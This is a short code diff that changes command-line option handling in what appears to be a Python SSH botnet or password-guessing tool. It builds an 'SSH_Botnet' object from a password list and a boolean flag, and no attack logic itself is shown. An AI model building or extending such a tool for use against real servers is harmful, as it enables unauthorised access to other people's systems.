@@ -344,7 +344,7 @@ class OptionParse:
     def get_args(self):
         self.opts = OptionParser()
         self.opts.add_option("--pL","--passlist",dest="passlist")
-        self.opts.add_option("--cO", "--captopt", dest="captopt")
+        self.opts.add_option("--cO", "--captopt", dest="captopt", action="store_true")
         self.opts.add_option("--i","--info",dest="info",action="store_true")
         args, opt = self.opts.parse_args()
         if args.passlist is None:
@@ -352,11 +352,8 @@ class OptionParse:
         else:
             passlist = args.passlist
         if args.captopt is None:
-            captopt = True
+            captopt = False
         else:
-            try:
-                captopt = bool(args.captopt)
-            except:
-                captopt = True
+            captopt = True
         Botnet = SSH_Botnet(passlist, captopt)
 optionparser = OptionParse()
